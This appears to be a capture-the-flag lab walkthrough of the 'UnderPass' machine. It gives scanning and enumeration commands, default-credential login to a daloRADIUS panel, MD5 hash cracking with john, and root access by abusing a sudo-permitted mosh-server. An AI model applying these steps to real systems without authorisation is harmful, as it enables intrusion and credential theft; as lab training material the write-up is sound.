---
title: UnderPass
published: true
layout: post
---

<br />

---------------
Underpass is an Easy Linux machine starting with a default Apache Ubuntu page. This leads the attacker to enumerate the machine's UDP ports for alternative attack vectors. The attacker can enumerate SNMP and discover that `Daloradius` is running on the remote machine, and the operators panel can be accessed using the default credentials. Inside the panel, the password hash for the user `svcMosh` is stored, and it's crackable. Then, the attacker can log in to the remote machine using SSH with the credentials they have obtained. The user `svcMosh` is configured to run `mosdh-server` as `root`, which allows the attacker to connect to the server from their local machine and interact with the remote machine as the `root` user. 
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/UQpAmApVGis?si=KZPyhrah2peI2Q-T" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 2 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sT 10.10.11.48 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.48 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **3 open ports**:
+ **22/tcp**
+ **80/tcp**
+ **161/udp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sU 10.10.11.48 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
sudo nmap -sU 10.10.11.48 -p 161 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are:
+ **22/tcp OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)**
+ **80/tcp Apache httpd 2.4.52 ((Ubuntu))**
+ **161/udp SNMPv1 server; net-snmp SNMPv3 server (public)**

<br />

There is an interesting message in the **UDP scan**:<br />
![](/assets/UnderPass/1.png)
<br />
<br />

We have a **hostname** and a **technology "daloradius"**, so let's add the hostname to our /etc/hosts file now and check what is daloradius in the next section:

```bash
echo "10.10.11.48 UnDerPass.htb" | sudo tee --append /etc/hosts
```
<br />

------
<br />
### Foothold

The first thing I did was inspect the SNMP service:

```bash
snmpwalk -v1 -c "public" 10.10.11.48 | grep STRING
```

![](/assets/UnderPass/2.png)
<br />
<br />

There is an email that may be handful later. Now searching for daloradius, we can find some vulnerabilities that doesn't work, but we find the daloradius main directory that may be relevant:<br />
![](/assets/UnderPass/3.png)
<br />
<br />

Let's delve deeper in the machine, searching for more sites, as the previous ones don't exist:

```bash
feroxbuster --url http://UnDerPass.htb/daloradius -r -x php --threads 25 -d 0 -o feroxbuster_dir_and_file_enum_80.txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404
```

![](/assets/UnderPass/4.png)
<br />
<br />

There are multiple sites, but some very interesting, **two login sites and one INSTALL document**. It seems that the user login site is for clients and the operators login site is for administrators, but the relevant information is on the INSTALL document:<br />
![](/assets/UnderPass/5.png)
<br />
<br />

We have credentials, so let's try them in both sites:<br />
![](/assets/UnderPass/6.png)
<br />
<br />

We logged in using the **operators site**, and we can see that there is just one user in the application, let's check it:<br />
![](/assets/UnderPass/7.png)
<br />
<br />

We got credentials, however the password seems to be hashed, let's identify the hash and crack it:

```bash
hashid 412DD4759978ACFCC81DEAB01B382403
echo "412DD4759978ACFCC81DEAB01B382403" > svcMosh_hash.txt
john svcMosh_hash.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/UnderPass/8.png)
<br />
<br />

We cracked the hash! However this credentials didn't work in the login sites, so I tried them in SSH:

```bash
ssh svcMosh@10.10.11.48
```

![](/assets/UnderPass/9.png)
<br />
<br />

------
<br />
### Privilege Escalation

Enumerating our permissions, we found something interesting:

```bash
sudo -l
```

![](/assets/UnderPass/10.png)
<br />
<br />

**Mosh** is known as the mobile shell, a **replacement for SSH**, and we can use it with root privileges, so I searched for privilege escalation techniques, and this is what I found:<br />
![](/assets/UnderPass/11.png)
<br />
<br />

It seems that we can launch a service listening for connections, so let's do it:

```bash
sudo /usr/bin/mosh-server 0.0.0.0
```

![](/assets/UnderPass/12.png)
<br />
<br />

Let's finally connect to the listener:

```bash
sudo apt install mosh
export MOSH_KEY=UC8a+83VAFJjSAqbeo62sQ
mosh-client 10.10.11.48 60001
```

![](/assets/UnderPass/13.png)
<br />
<br />
